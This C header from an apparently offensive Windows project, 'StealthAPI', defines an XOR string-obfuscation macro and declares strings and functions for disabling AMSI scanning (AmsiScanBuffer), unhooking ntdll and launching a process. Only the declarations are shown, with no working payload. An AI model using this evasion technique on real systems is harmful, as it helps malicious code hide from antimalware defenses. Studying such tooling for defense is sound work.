............................................................................
. Project: StealthAPI                                                      .
. Build for educational purpose in authorized lab environments only.        .
. Author: Ebere Michhael (Call Simba)                                      .
. Telegram: @lets_sudosu                                                   .
. Make the world a better place.                                           .
............................................................................

#ifndef STRINGS_H
#define STRINGS_H

#define XOR_KEY 0x5A

#define OBFUSCATE_STR(str)             \
    do {                               \
        for (int i = 0; (str)[i]; i++) \
            (str)[i] ^= XOR_KEY;       \
    } while (0)

#define DEOBFUSCATE_STR(str) OBFUSCATE_STR(str)

#ifdef __cplusplus
extern "C" {
#endif

extern char g_AmsiDll[];
extern char g_AmsiScanBuffer[];
extern char g_AllocFail[];
extern char g_SecondAllocFail[];
extern char g_JumpLog[];
extern char logEnter[];
extern char logMap[];
extern char logUnhook[];
extern char logUnhookFail[];
extern char logUnhookSuccess[];
extern char logPatch[];
extern char logLaunch[];
extern char g_NtdllPath[];
extern char g_NotepadExe[];

extern void DecryptString(char* str);
extern char* JitDecrypt(const char* enc, size_t len, BYTE key);

#ifdef __cplusplus
}
#endif

#endif